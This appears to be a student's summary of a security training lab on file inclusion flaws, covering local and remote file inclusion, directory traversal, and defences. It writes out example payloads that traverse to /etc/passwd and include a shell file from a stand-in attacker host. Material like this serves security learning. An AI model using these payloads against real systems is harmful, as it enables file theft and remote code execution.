# 📂 File Inclusion Room – Summary

## 📝 Room Overview
In the **File Inclusion** room, I learned about file inclusion vulnerabilities and how attackers can use them to read sensitive files or even gain remote code execution. The room introduced **Local File Inclusion (LFI)**, **Remote File Inclusion (RFI)**, and **directory traversal** techniques, and showed how poor handling of user-supplied input in file paths can expose an application.

---

## 🔍 What I Learned

### 1. Local File Inclusion (LFI)
- **Lesson:** I learned how attackers can exploit an application that dynamically loads files (e.g., `page=home.php`) by modifying parameters to include local files.
- **Example:** Supplying `page=../../../../etc/passwd` can expose sensitive system files.
- **Takeaway:** LFI can be used to read logs, configuration files, and sometimes escalate to RCE (e.g., via log poisoning).

---

### 2. Remote File Inclusion (RFI)
- **Lesson:** I discovered how some applications allow external URLs to be loaded as files.
- **Example:** Supplying `page=http://attacker.com/shell.txt` can let an attacker execute malicious code.
- **Takeaway:** RFI is more severe than LFI and can lead directly to remote code execution if `allow_url_include` is enabled.

---

### 3. Directory Traversal
- **Lesson:** I practiced using `../` sequences to escape from restricted directories and access files outside the intended folder.
- **Example:** Requesting `page=../../../../etc/hosts` bypassed the intended restriction.
- **Takeaway:** Directory traversal is often combined with LFI to retrieve sensitive files.

---

### 4. Defensive Awareness
- **Key lessons:**  
  - Never trust user input for file paths.  
  - Implement whitelisting for allowed files instead of dynamically including user input.  
  - Disable dangerous PHP functions like `allow_url_fopen` and `allow_url_include`.  
  - Use secure coding practices to prevent directory traversal (`realpath()`, input sanitization).  

---

## 🎯 Key Skills Gained
- Identifying and exploiting **LFI** and **RFI** vulnerabilities.  
- Using **directory traversal** techniques to access restricted files.  
- Leveraging LFI for potential escalation (e.g., log poisoning, code injection).  
- Understanding how to secure applications against file inclusion flaws.  
